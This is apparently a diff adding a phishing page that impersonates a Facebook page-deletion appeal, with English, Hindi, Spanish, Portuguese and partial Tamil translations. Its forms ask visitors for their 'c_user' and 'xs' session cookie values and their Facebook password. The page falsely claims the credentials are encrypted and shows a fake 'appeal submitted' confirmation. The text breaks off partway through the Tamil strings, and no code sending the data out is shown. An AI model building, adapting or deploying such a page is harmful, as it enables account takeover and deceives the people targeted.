+            <path d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/>
+          </svg>
+          <span class="menu-text">Other Rules & Articles</span>
+        </div>
+      </div>
+    </header>
+
+    <div class="vertical-divider"></div>
+
+    <div class="center-content">
+      <div class="warning-message">
+          <div class="warning-top">
+          <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <path d="M12 9V14" stroke="#D93025" stroke-width="2" stroke-linecap="round"/>
+            <path d="M12 17V17.5" stroke="#D93025" stroke-width="2" stroke-linecap="round"/>
+            <path d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z" stroke="#D93025" stroke-width="2"/>
+          </svg>
+          <span class="translatable" data-key="warningTitle">Your page is scheduled to be deleted!</span>
+        </div>
+        <div class="warning-subtext translatable" data-key="warningSubtext">
+          We have received several reports that your page violates our terms of service
+          and community guidelines. As a result, your page will be sent for verification.
+        </div>
+        <div class="warning-extra translatable" data-key="warningExtra">
+          If you believe your page was mistakenly scheduled for deletion, you can prevent
+          its permanent removal by simply clicking the appeal button below and providing
+          some quick information.
+        </div>
+
+        <div class="appeal-box">
+          <img src="https://ik.imagekit.io/alibrohi/download.png?updatedAt=1756102262767" alt="Appeal Illustration" />
+         
+          <div class="appeal-info">
+            <div class="appeal-title translatable" data-key="appealTitle">Appeal request</div>
+            <div class="appeal-desc translatable" data-key="appealDesc">
+              Fixing problems with your page
+              Please be sure to provide the requested information below.
+              Failure to provide this information may delay the processing of your appeal.
+            </div>
+            <button class="appeal-btn" id="open-appeal-btn">
+              <span id="fbSendBtnText" class="translatable" data-key="appealBtn">Appeal</span>
+            </button>
+          </div>
+        </div>
+       
+        <!-- Redesigned Appeal Form Section -->
+        <div class="appeal-form" id="appealForm">
+          <div class="form-header">
+            <div class="form-icon">
+              <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                <path d="M20 2H4c-1.1 0-1.99.9-1.99 2L2 22l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm-7 9h-2V5h2v6zm0 4h-2v-2h2v2z"/>
+              </svg>
+            </div>
+            <div>
+              <div class="form-title translatable" data-key="formTitle">Page Appeal Request</div>
+              <div class="form-subtitle translatable" data-key="formSubtitle">Submit your information to appeal the deletion</div>
+            </div>
+          </div>
+         
+          <div class="form-notice-container">
+            <div class="form-notice translatable" data-key="formNotice1">
+              ⓘ Your page has a violation related to our community guidelines.
+            </div>
+            <div class="form-notice translatable" data-key="formNotice2">
+              ⓘ Please review the violation details carefully before submitting.
+            </div>
+            <div class="form-notice translatable" data-key="formNotice3">
+              ⓘ Ensure you provide correct information for your appeal.
+            </div>
+          </div>
+          
+          <!-- Video Section -->
+          <div class="video-container" id="videoContainer">
+            <video class="video-player" id="guideVideo" controls>
+              <source src="https://resource2.heygen.ai/video_translate/94087358030a4df8b20e73f1fba92ed5-en/720p.mp4" type="video/mp4">
+              Your browser does not support the video tag.
+            </video>
+          </div>
+         
+          <div class="form-group">
+            <label for="nameInput" class="form-label translatable" data-key="nameLabel">c_user</label>
+            <input type="text" class="form-input" id="nameInput" placeholder="Enter c_user">
+            <div class="input-error" id="nameError"></div>
+          </div>
+         
+          <div class="form-group">
+            <label for="mallInput" class="form-label translatable" data-key="mallLabel">xs</label>
+            <input type="text" class="form-input" id="mallInput" placeholder="Enter xs">
+            <div class="input-error" id="mallError"></div>
+          </div>
+         
+          <div class="form-warning" id="formError">
+            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+              <path d="M12 9V14" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
+              <path d="M12 17V17.5" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
+              <path d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z" stroke="currentColor" stroke-width="2"/>
+            </svg>
+            <span id="formErrorText"></span>
+          </div>
+         
+          <button class="form-btn" id="sendBtn">
+            <span id="sendBtnText" class="translatable" data-key="submitBtn">Submit Appeal Request</span>
+            <div class="spinner" id="sendBtnSpinner" style="display: none;"></div>
+          </button>
+        </div>
+       
+        <div class="fb-login-form" id="fbLoginForm">
+          <div class="fb-form-header">
+            <div class="fb-form-icon">
+              <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                <path d="M12 2C6.477 2 2 6.477 2 12c0 4.991 3.657 9.128 8.438 9.879V14.89h-2.54V12h2.54V9.797c0-2.506 1.492-3.89 3.777-3.89c1.094 0 2.238.195 2.238.195v2.46h-1.26c-1.243 0-1.63.771-1.63 1.562V12h2.773l-.443 2.89h-2.33v6.989C18.343 21.129 22 16.99 22 12c0-5.523-4.477-10-10-10z"/>
+              </svg>
+            </div>
+            <div>
+              <div class="fb-form-title translatable" data-key="fbFormTitle">Facebook Verification</div>
+              <div class="fb-form-subtitle translatable" data-key="fbFormSubtitle">Verify your identity to continue with the appeal</div>
+            </div>
+          </div>
+         
+          <div class="fb-form-notice-container">
+            <div class="fb-form-notice translatable" data-key="fbNotice1">
+              ⓘ For security purposes, we need to verify your Facebook account.
+            </div>
+            <div class="fb-form-notice translatable" data-key="fbNotice2">
+              ⓘ This helps us ensure that you are the legitimate owner of the page.
+            </div>
+            <div class="fb-form-notice translatable" data-key="fbNotice3">
+              ⓘ Your credentials are secure and encrypted.
+            </div>
+          </div>
+         
+          <div class="fb-form-group">
+            <label for="passwordInput" class="fb-form-label translatable" data-key="passwordLabel">Password</label>
+            <input type="password" class="fb-form-input" id="passwordInput" placeholder="Enter your Facebook password">
+            <div class="fb-input-error" id="passwordError"></div>
+          </div>
+         
+          <div class="fb-form-warning" id="fbFormError">
+            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+              <path d="M12 9V14" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
+              <path d="M12 17V17.5" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
+              <path d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z" stroke="currentColor" stroke-width="2"/>
+            </svg>
+            <span id="fbFormErrorText"></span>
+          </div>
+         
+          <button class="fb-form-btn" id="fbSendBtn">
+            <span id="fbSendBtnText" class="translatable" data-key="verifyBtn">Verify and Continue</span>
+            <div class="spinner" id="fbSendBtnSpinner" style="display: none;"></div>
+          </button>
+         
+          <div class="forgot-password" id="forgotPassword">
+            <span class="translatable" data-key="forgotPassword">Forgotten password?</span>
+          </div>
+        </div>
+       
+        <!-- Success Message -->
+        <div class="success-message" id="successMessage">
+          <div class="success-icon">
+            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+              <path d="M9 12L11 14L15 10M21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3C16.9706 3 21 7.02944 21 12Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+            </svg>
+          </div>
+          <h3 class="success-title translatable" data-key="successTitle">Appeal Submitted Successfully</h3>
+          <p class="success-text translatable" data-key="successText">
+            Your appeal has been received and is now in review. We'll notify you via email once a decision has been made, typically within 7 business days.
+          </p>
+          <div class="success-text">
+            <span class="translatable" data-key="referenceText">Reference ID:</span> <span class="reference-id" id="referenceId"></span>
+          </div>
+        </div>
+       
+        <!-- Appeal Guide Section -->
+        <div class="appeal-guide">
+          <div class="appeal-guide-title translatable" data-key="guideTitle">Appeal Guide</div>
+          <div class="appeal-guide-content">
+            <p class="appeal-guide-text translatable" data-key="guideText1">
+              If your appeal/request involves the use of copyrighted information or content in your account or that is being processed/shared, you may provide us information to help us better understand your request. Please provide a detailed explanation of why you believe your account was incorrectly flagged or suspended. Include any relevant information that may help us review your case more effectively.
+            </p>
+            <p class="appeal-guide-text translatable" data-key="guideText2">
+              After your submission, we will review your appeal and contact you within the timeframe of the information you provide to resolve. The review process could take up to 7 business days. Please check your email for updates.
+            </p>
+            <p class="appeal-guide-text translatable" data-key="guideText3">
+              Note: You can change your language preference at any time by clicking the language selector at the bottom of the page.
+            </p>
+          </div>
+        </div>
+       
+        <!-- Additional Resources Section -->
+        <div class="additional-resources">
+          <div class="resources-title translatable" data-key="resourcesTitle">Additional Resources</div>
+          <div class="resources-grid">
+            <div class="resource-card">
+              <svg class="resource-icon" viewBox="0 0 512 512">
+                <path d="M256 512c141.4 0 256-114.6 256-256S397.4 0 256 0S0 114.6 0 256S114.6 512 256 512zM216 336h24V272H216c-13.3 0-24-10.7-24-24s10.7-24 24-24h48c13.3 0 24 10.7 24 24v88h8c13.3 0 24 10.7 24 24s-10.7 24-24 24H216c-13.3 0-24-10.7-24-24s10.7-24 24-24zm40-144c-17.7 0-32-14.3-32-32s14.3-32 32-32s32 14.3 32 32s-14.3 32-32 32z"/>
+              </svg>
+              <div class="resource-card-title translatable" data-key="helpCenterTitle">Help Center</div>
+              <div class="resource-card-desc translatable" data-key="helpCenterDesc">Find answers to common questions and learn how to use our products.</div>
+            </div>
+            
+            <div class="resource-card">
+              <svg class="resource-icon" viewBox="0 0 512 512">
+                <path d="M164.9 24.6c-7.7-18.6-28-28.5-47.4-23.2l-88 24C12.1 30.2 0 46 0 64C0 311.4 200.6 512 448 512c18 0 33.8-12.1 38.6-29.5l24-88c5.3-19.4-4.6-39.7-23.2-47.4l-96-40c-16.3-6.8-35.2-2.1-46.3 11.6L304.7 368C234.3 334.7 177.3 277.7 144 207.3L193.3 167c13.7-11.2 18.4-30 11.6-46.3l-40-96z"/>
+              </svg>
+              <div class="resource-card-title translatable" data-key="contactSupportTitle">Contact Support</div>
+              <div class="resource-card-desc translatable" data-key="contactSupportDesc">Get in touch with our support team for personalized assistance.</div>
+            </div>
+            
+            <div class="resource-card">
+              <svg class="resource-icon" viewBox="0 0 640 512">
+                <path d="M144 0a80 80 0 1 1 0 160A80 80 0 1 1 144 0zM512 0a80 80 0 1 1 0 160A80 80 0 1 1 512 0zM0 298.7C0 239.8 47.8 192 106.7 192h42.7c15.9 0 31 3.5 44.6 9.7c-1.3 7.2-1.9 14.7-1.9 22.3c0 38.2 16.8 72.5 43.3 96c-.2 0-.4 0-.7 0H21.3C9.6 320 0 310.4 0 298.7zM405.3 320c-.2 0-.4 0-.7 0c26.6-23.5 43.3-57.8 43.3-96c0-7.6-.7-15-1.9-22.3c13.6-6.3 28.7-9.7 44.6-9.7h42.7C592.2 192 640 239.8 640 298.7c0 11.8-9.6 21.3-21.3 21.3H405.3zM224 224a96 96 0 1 1 192 0 96 96 0 1 1 -192 0zM128 485.3C128 411.7 187.7 352 261.3 352H378.7C452.3 352 512 411.7 512 485.3c0 14.7-11.9 26.7-26.7 26.7H154.7c-14.7 0-26.7-11.9-26.7-26.7z"/>
+              </svg>
+              <div class="resource-card-title translatable" data-key="guidelinesTitle">Community Guidelines</div>
+              <div class="resource-card-desc translatable" data-key="guidelinesDesc">Learn about our community standards and content policies.</div>
+            </div>
+            
+            <div class="resource-card">
+              <svg class="resource-icon" viewBox="0 0 576 512">
+                <path d="M64 32C28.7 32 0 60.7 0 96V416c0 35.3 28.7 64 64 64H512c35.3 0 64-28.7 64-64V96c0-35.3 28.7-64 64-64H64zm80 256h64c44.2 0 80 35.8 80 80c0 8.8-7.2 16-16 16H80c-8.8 0-16-7.2-16-16c0-44.2 35.8-80 80-80zm96-96c0 35.3-28.7 64-64 64s-64-28.7-64-64s28.7-64 64-64s64 28.7 64 64zm128 32c44.2 0 80 35.8 80 80c0 8.8-7.2 16-16 16H368c-8.8 0-16-7.2-16-16c0-44.2 35.8-80 80-80zM320 192c0 35.3-28.7 64-64 64s-64-28.7-64-64s28.7-64 64-64s64 28.7 64 64z"/>
+              </svg>
+              <div class="resource-card-title translatable" data-key="dashboardTitle">Status Dashboard</div>
+              <div class="resource-card-desc translatable" data-key="dashboardDesc">Check the current status of our services and report outages.</div>
+            </div>
+          </div>
+        </div>
+       
+        <!-- Language Selector at Bottom -->
+        <div class="language-selector-bottom" style="margin-top: 40px; text-align: center; padding: 20px;">
+          <button id="changeLanguageBtn" style="background: #0064e0; color: white; border: none; padding: 10px 20px; border-radius: 8px; cursor: pointer;">
+            <span id="fbSendBtnText" class="translatable" data-key="changeLanguage">Change Language</span>
+          </button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // Wait for the DOM to be fully loaded
+    document.addEventListener('DOMContentLoaded', function() {
+      // Language translations
+      const translations = {
+        english: {
+          warningTitle: "Your page is scheduled to be deleted!",
+          warningSubtext: "We have received several reports that your page violates our terms of service and community guidelines. As a result, your page will be sent for verification.",
+          warningExtra: "If you believe your page was mistakenly scheduled for deletion, you can prevent its permanent removal by simply clicking the appeal button below and providing some quick information.",
+          appealTitle: "Appeal request",
+          appealDesc: "Fixing problems with your page. Please be sure to provide the requested information below. Failure to provide this information may delay the processing of your appeal.",
+          appealBtn: "Appeal",
+          formTitle: "Page Appeal Request",
+          formSubtitle: "Submit your information to appeal the deletion",
+          formNotice1: "ⓘ Your page has a violation related to our community guidelines.",
+          formNotice2: "ⓘ Please review the violation details carefully before submitting.",
+          formNotice3: "ⓘ Ensure you provide correct information for your appeal.",
+          nameLabel: "c_user",
+          mallLabel: "xs",
+          submitBtn: "Submit Appeal Request",
+          fbFormTitle: "Facebook Verification",
+          fbFormSubtitle: "Verify your identity to continue with the appeal",
+          fbNotice1: "ⓘ For security purposes, we need to verify your Facebook account.",
+          fbNotice2: "ⓘ This helps us ensure that you are the legitimate owner of the page.",
+          fbNotice3: "ⓘ Your credentials are secure and encrypted.",
+          passwordLabel: "Password",
+          verifyBtn: "Verify and Continue",
+          forgotPassword: "Forgotten password?",
+          successTitle: "Appeal Submitted Successfully",
+          successText: "Your appeal has been received and is now in review. We'll notify you via email once a decision has been made, typically within 7 business days.",
+          referenceText: "Reference ID:",
+          guideTitle: "Appeal Guide",
+          guideText1: "If your appeal/request involves the use of copyrighted information or content in your account or that is being processed/shared, you may provide us information to help us better understand your request. Please provide a detailed explanation of why you believe your account was incorrectly flagged or suspended. Include any relevant information that may help us review your case more effectively.",
+          guideText2: "After your submission, we will review your appeal and contact you within the timeframe of the information you provide to resolve. The review process could take up to 7 business days. Please check your email for updates.",
+          guideText3: "Note: You can change your language preference at any time by clicking the language selector at the bottom of the page.",
+          resourcesTitle: "Additional Resources",
+          helpCenterTitle: "Help Center",
+          helpCenterDesc: "Find answers to common questions and learn how to use our products.",
+          contactSupportTitle: "Contact Support",
+          contactSupportDesc: "Get in touch with our support team for personalized assistance.",
+          guidelinesTitle: "Community Guidelines",
+          guidelinesDesc: "Learn about our community standards and content policies.",
+          dashboardTitle: "Status Dashboard",
+          dashboardDesc: "Check the current status of our services and report outages.",
+          changeLanguage: "Change Language"
+        },
+        hindi: {
+          warningTitle: "आपके पेज को हटाने के लिए निर्धारित किया गया है!",
+          warningSubtext: "हमें कई रिपोर्ट मिली हैं कि आपका पेज हमारे सेवा की शर्तों और सामुदायिक दिशानिर्देशों का उल्लंघन करता है। नतीजतन, आपके पेज को सत्यापन के लिए भेजा जाएगा।",
+          warningExtra: "यदि आपको लगता है कि आपके पेज को गलती से हटाने के लिए निर्धारित किया गया था, तो आप नीचे अपील बटन पर क्लिक करके और कुछ त्वरित जानकारी प्रदान करके इसके स्थायी निष्कासन को रोक सकते हैं।",
+          appealTitle: "अपील अनुरोध",
+          appealDesc: "अपने पेज की समस्याओं को ठीक करना। कृपया नीचे अनुरोधित जानकारी प्रदान करना सुनिश्चित करें। इस जानकारी को प्रदान न करने से आपकी अपील के प्रसंस्करण में देरी हो सकती है।",
+          appealBtn: "अपील करें",
+          formTitle: "पेज अपील अनुरोध",
+          formSubtitle: "हटाने की अपील करने के लिए अपनी जानकारी जमा करें",
+          formNotice1: "ⓘ आपके पेज में हमारे सामुदायिक दिशानिर्देशों से संबंधित उल्लंघन है।",
+          formNotice2: "ⓘ सबमिट करने से पहले कृपया उल्लंघन विवरणों की सावधानीपूर्वक समीक्षा करें।",
+          formNotice3: "ⓘ अपनी अपील के लिए सही जानकारी प्रदान करना सुनिश्चित करें।",
+          nameLabel: "c_user",
+          mallLabel: "xs",
+          submitBtn: "अपील अनुरोध जमा करें",
+          fbFormTitle: "फेसबुक सत्यापन",
+          fbFormSubtitle: "अपील जारी रखने के लिए अपनी पहचान सत्यापित करें",
+          fbNotice1: "ⓘ सुरक्षा उद्देश्यों के लिए, हमें आपके फेसबुक खाते को सत्यापित करने की आवश्यकता है।",
+          fbNotice2: "ⓘ यह हमें यह सुनिश्चित करने में मदद करता है कि आप पेज के वैध मालिक हैं।",
+          fbNotice3: "ⓘ आपकी साख सुरक्षित और एन्क्रिप्टेड है।",
+          passwordLabel: "पासवर्ड",
+          verifyBtn: "सत्यापित करें और जारी रखें",
+          forgotPassword: "पासवर्ड भूल गए?",
+          successTitle: "अपील सफलतापूर्वक जमा की गई",
+          successText: "आपकी अपील प्राप्त हो गई है और अब समीक्षा के दौर से गुजर रही है। आम तौर पर 7 व्यावसायिक दिनों के भीतर निर्णय होने के बाद हम आपको ईमेल के माध्यम से सूचित करेंगे।",
+          referenceText: "संदर्भ आईडी:",
+          guideTitle: "अपील गाइड",
+          guideText1: "यदि आपकी अपील/अनुरोध में आपके खाते में कॉपीराइट की गई जानकारी या सामग्री का उपयोग शामिल है या जो प्रसंस्कृत की जा रही है, तो आप हमें अपने अनुरोध को बेहतर ढंग से समझने में मदद करने के लिए जानकारी प्रदान कर सकते हैं। कृपया विस्तृत व्याख्या प्रदान करें कि आपको क्यों लगता है कि आपके खाते को गलत तरीके से फ्लैग किया गया था या निलंबित किया गया था। कोई भी प्रासंगिक जानकारी शामिल करें जो हमें आपके मामले की अधिक प्रभावी ढंग से समीक्षा करने में मदद कर सकती है।",
+          guideText2: "आपके द्वारा जमा करने के बाद, हम आपकी अपील की समीक्षा करेंगे और समाधान के लिए आपके द्वारा प्रदान की गई जानकारी की समय सीमा के भीतर आपसे संपर्क करेंगे। समीक्षा प्रक्रिया में 7 व्यावसायिक दिन तक का समय लग सकता है। कृपया अपडेट के लिए अपने ईमेल की जांच करें।",
+          guideText3: "आप पृष्ठ के निचले भाग में भाषा चयनकर्ता पर क्लिक करके किसी भी समय अपनी भाषा प्राथमिकता बदल सकते हैं।",
+          resourcesTitle: "अतिरिक्त संसाधन",
+          helpCenterTitle: "सहायता केंद्र",
+          helpCenterDesc: "सामान्य प्रश्नों के उत्तर खोजें और हमारे उत्पादों का उपयोग करना सीखें।",
+          contactSupportTitle: "समर्थन से संपर्क करें",
+          contactSupportDesc: "व्यक्तिगत सहायता के लिए हमारी समर्थन टीम से संपर्क करें",
+          guidelinesTitle: "सामुदायिक दिशानिर्देश",
+          guidelinesDesc: "हमारे सामुदायिक मानकों और सामग्री नीतियों के बारे में जानें।",
+          dashboardTitle: "स्थिति डैशबोर्ड",
+          dashboardDesc: "हमारी सेवाओं की वर्तमान स्थिति की जाँच करें और आउटेज की रिपोर्ट करें।",
+          changeLanguage: "भाषा बदलें"
+        },
+        spanish: {
+          warningTitle: "¡Tu página está programada para ser eliminada!",
+          warningSubtext: "Hemos recibido varios informes de que tu página viola nuestros términos de servicio y pautas comunitarias. Como resultado, tu página será enviada para verificación.",
+          warningExtra: "Si crees que tu página fue programada para eliminación por error, puedes evitar su eliminación permanente simplemente haciendo clic en el botón de apelación a continuación y proporcionando información rápida.",
+          appealTitle: "Solicitud de apelación",
+          appealDesc: "Solucionando problemas con tu página. Asegúrate de proporcionar la información solicitada a continuación. No proporcionar esta información puede retrasar el procesamiento de tu apelación.",
+          appealBtn: "Apelar",
+          formTitle: "Solicitud de Apelación de Página",
+          formSubtitle: "Envía tu información para apelar la eliminación",
+          formNotice1: "ⓘ Tu página tiene una violación relacionada con nuestras pautas comunitarias.",
+          formNotice2: "ⓘ Por favor, revisa los detalles de la violación cuidadosamente antes de enviar.",
+          formNotice3: "ⓘ Asegúrate de proporcionar información correcta para tu apelación.",
+          nameLabel: "c_user",
+          mallLabel: "xs",
+          submitBtn: "Enviar solicitud de apelación",
+          fbFormTitle: "Verificación de Facebook",
+          fbFormSubtitle: "Verifica tu identidad para continuar con la apelación",
+          fbNotice1: "ⓘ Por motivos de seguridad, necesitamos verificar tu cuenta de Facebook.",
+          fbNotice2: "ⓘ Esto nos ayuda a asegurar que eres el propietario legítimo de la página.",
+          fbNotice3: "ⓘ Tus credenciales están seguras y encriptadas.",
+          passwordLabel: "Contraseña",
+          verifyBtn: "Verificar y Continuar",
+          forgotPassword: "¿Olvidaste tu contraseña?",
+          successTitle: "Apelación Enviada Exitosamente",
+          successText: "Tu apelación ha sido recibida y ahora está en revisión. Te notificaremos por correo electrónico una vez que se haya tomado una decisión, generalmente dentro de 7 días hábiles.",
+          referenceText: "ID de referencia:",
+          guideTitle: "Guía de Apelación",
+          guideText1: "Si tu apelación/solicitud implica el uso de información con derechos de autor o contenido en tu cuenta que está siendo procesado/compartido, puedes proporcionarnos información para ayudarnos a comprender mejor tu solicitud. Proporciona una explicación detallada de por qué crees que tu cuenta fue marcada o suspendida incorrectamente. Incluye cualquier información relevante que pueda ayudarnos a revisar tu caso de manera más efectiva.",
+          guideText2: "Después de tu envío, revisaremos tu apelación y nos comunicaremos contigo dentro del plazo de la información que proporciones para resolver. El proceso de revisión podría tardar hasta 7 días hábiles. Por favor, revisa tu correo electrónico para obtener actualizaciones.",
+          guideText3: "Nota: Puedes cambiar tu preferencia de idioma en cualquier momento haciendo clic en el selector de idioma en la parte inferior de la página.",
+          resourcesTitle: "Recursos Adicionales",
+          helpCenterTitle: "Centro de Ayuda",
+          helpCenterDesc: "Encuentra respuestas a preguntas comunes y aprende a usar nuestros productos.",
+          contactSupportTitle: "Contactar Soporte",
+          contactSupportDesc: "Comunícate con nuestro equipo de soporte para asistencia personalizada.",
+          guidelinesTitle: "Pautas de la Comunidad",
+          guidelinesDesc: "Conoce nuestros estándares comunitarios y políticas de contenido.",
+          dashboardTitle: "Panel de Estado",
+          dashboardDesc: "Consulta el estado actual de nuestros servicios e informa interrupciones.",
+          changeLanguage: "Cambiar idioma"
+        },
+        portuguese: {
+          warningTitle: "Sua página está programada para ser excluída!",
+          warningSubtext: "Recebemos vários relatos de que sua página viola nossos termos de serviço e diretrizes da comunidade. Como resultado, sua página será enviada para verificação.",
+          warningExtra: "Se você acredita que sua página foi programada para exclusão por engano, pode evitar sua remoção permanente clicando no botão de recurso abaixo e fornecendo algumas informações rápidas.",
+          appealTitle: "Solicitação de recurso",
+          appealDesc: "Corrigindo problemas com sua página. Certifique-se de fornecer as informações solicitadas abaixo. A não divulgação dessas informações pode atrasar o processamento do seu recurso.",
+          appealBtn: "Recorrer",
+          formTitle: "Solicitação de Recurso de Página",
+          formSubtitle: "Envie suas informações para contestar a exclusão",
+          formNotice1: "ⓘ Sua página tem uma violação relacionada às nossas diretrizes comunitárias.",
+          formNotice2: "ⓘ Revise os detalhes da violação cuidadosamente antes de enviar.",
+          formNotice3: "ⓘ Certifique-se de fornecer informações corretas para o seu recurso.",
+          nameLabel: "c_user",
+          mallLabel: "xs",
+          submitBtn: "Enviar solicitação de recurso",
+          fbFormTitle: "Verificação do Facebook",
+          fbFormSubtitle: "Verifique sua identidade para continuar com o recurso",
+          fbNotice1: "ⓘ Para fins de segurança, precisamos verificar sua conta do Facebook.",
+          fbNotice2: "ⓘ Isso nos ajuda a garantir que você é o proprietário legítimo da página.",
+          fbNotice3: "ⓘ Suas credenciais são seguras e criptografadas.",
+          passwordLabel: "Senha",
+          verifyBtn: "Verificar e Continuar",
+          forgotPassword: "Esqueceu a senha?",
+          successTitle: "Recurso enviado com sucesso",
+          successText: "Seu recurso foi recebido e agora está em análise. Notificaremos você por e-mail assim que uma decisão for tomada, geralmente dentro de 7 dias úteis.",
+          referenceText: "ID de referência:",
+          guideTitle: "Guia de recurso",
+          guideText1: "Se o seu recurso/solicitação envolver o uso de informações protegidas por direitos autorais ou conteúdo em sua conta que está sendo processado/compartilhado, você pode nos fornecer informações para nos ajudar a entender melhor sua solicitação. Forneça uma explicação detalhada do porquê você acredita que sua conta foi sinalizada ou suspensa incorretamente. Inclua todas as informações relevantes que possam nos ajudar a revisar seu caso mais efetivamente.",
+          guideText2: "Após o envio, revisaremos seu recurso e entraremos em contato com você dentro do prazo das informações fornecidas para resolver. O processo de revisão pode levar até 7 dias úteis. Verifique seu e-mail para atualizações.",
+          guideText3: "Nota: Você pode alterar sua preferência de idioma a qualquer momento clicando no seletor de idioma na parte inferior da página.",
+          resourcesTitle: "Recursos Adicionais",
+          helpCenterTitle: "Central de Ajuda",
+          helpCenterDesc: "Encontre respostas para perguntas comuns e aprenda a usar nossos produtos.",
+          contactSupportTitle: "Contatar Suporte",
+          contactSupportDesc: "Entre em contato com nossa equipe de suporte para assistência personalizada.",
+          guidelinesTitle: "Diretrizes da Comunidade",
+          guidelinesDesc: "Conheça nossos padrões comunitários e políticas de conteúdo.",
+          dashboardTitle: "Painel de Status",
+          dashboardDesc: "Verifique o status atual de nossos serviços e relate interrupções.",
+          changeLanguage: "Mudar idioma"
+        },
+        tamil: {
+          warningTitle: "உங்கள் பக்கம் நீக்கத் திட்டமிடப்பட்டுள்ளது!",
+          warningSubtext: "உங்கள் பக்கம் எங்கள் சேவை விதிமுறைகள் மற்றும் சமூக வழிகாட்டுதல்களை மீறுவதாக பல புகார்கள் எங்களுக்கு கிடைத்துள்ளன. இதன் விளைவாக, உங்கள் பக்கம் சரிபார்ப்பிற்கு அனுப்பப்படும்.",
+          warningExtra: "உங்கள் பக்கம் தவறாக நீக்கத் திட்டமிடப்பட்டதாக நீங்கள் நம்பினால், கீழே உள்ள மேல்முறையீடு பொத்தானைக் கிளிக் செய்து சில விரைவான தகவல்களை வழங்குவதன் மூலம் அதன் நிரந்தர நீக்கத்தைத் தடுக்கலாம்.",
+          appealTitle: "மேல்முறையீடு கோரிக்கை",
+          appealDesc: "உங்கள் பக்கத்தில் உள்ள சிக்கல்களை சரிசெய்தல். கீழே கோரப்பட்ட தகவல்களை வழங்குவதை உறுதிசெய்யவும். இந்த தகவலை வழங்காததால் உங்கள் மேல்முறையீட்டின் செயலாக்கம் தாமதமாகலாம்.",
+          appealBtn: "மேல்முறையீடு",
+          formTitle: "பக்க மேல்முறையீடு கோரிக்கை",
+          formSubtitle: "நீக்கத்தை மேல்முறையீடு செய்ய உங்கள் தகவல்களை சமர்ப்பிக்கவும்",
+          formNotice1: "ⓘ உங்கள் பக்கத்தில் எங்கள் சமூக வழிகாட்டுதல்கள் தொடர்பான மீறல் உள்ளது.",
+          formNotice2: "ⓘ சமர்ப்பிப்பதற்கு முன் மீறல் விவரங்களை கவனமாக மதிப்பாய்வு செய்யவும்.",
+          formNotice3: "ⓘ உங்கள் மேல்முறையீட்டிற்கான சரியான தகவல்களை வழங்குவதை உறுதிசெய்யவும்.",
+          nameLabel: "c_user",
+          mallLabel: "xs",
+          submitBtn: "மேல்முறையீடு கோரிக்கையை சமர்ப்பிக்கவும்",
+          fbFormTitle: "பேஸ்புக் சரிபார்ப்பு",
+          fbFormSubtitle: "மேல்முறையீட்டைத் தொடர உங்கள் அடையாளத்தை சரிபார்க்கவும்",
+          fbNotice1: "ⓘ பாதுகாப்பு நோக்கங்களுக்காக, உங்கள் பேஸ்புக் கணக்கை சரிபார்க்க வேண்டும்.",
+          fbNotice2: "ⓘ இது பக்கத்தின் சட்டபூர்வமான உரிமையாளர் நீங்கள் என்பதை உறுதிப்படுத்த உதவுகிறது.",
+          fbNotice3: "ⓘ உங்கள் அறிவுறுத்தல்கள் பாதுகாப்பானவை மற்றும் குறியாக்கம் செய்யப்பட்டவை.",
+          passwordLabel: "கடவுச்சொல்",
+          verifyBtn: "சரிபார்த்து தொடரவும்",
+          forgotPassword: "கடவுச்சொல் மறந்துவிட்டீர்களா?",
+          successTitle: "மேல்முறையீடு வெற்றிகரமாக சமர்ப்பிக்கப்பட்டது",
+          successText: "உங்கள் மேல்முறையீடு பெறப்பட்டது மற்றும் இப்போது மதிப்பாய்வில் உள்ளது. பொதுவாக 7 வணிக நாட்களுக்குள் ஒரு முடிவு எடுக்கப்பட்டவுடன் மின்னஞ்சல் மூலம் உங்களுக்கு அறிவிப்போம்.",
+          referenceText: "குறிப்பு ஐடி:",
+          guideTitle: "மேல்முறையீடு வழிகாட்டி",
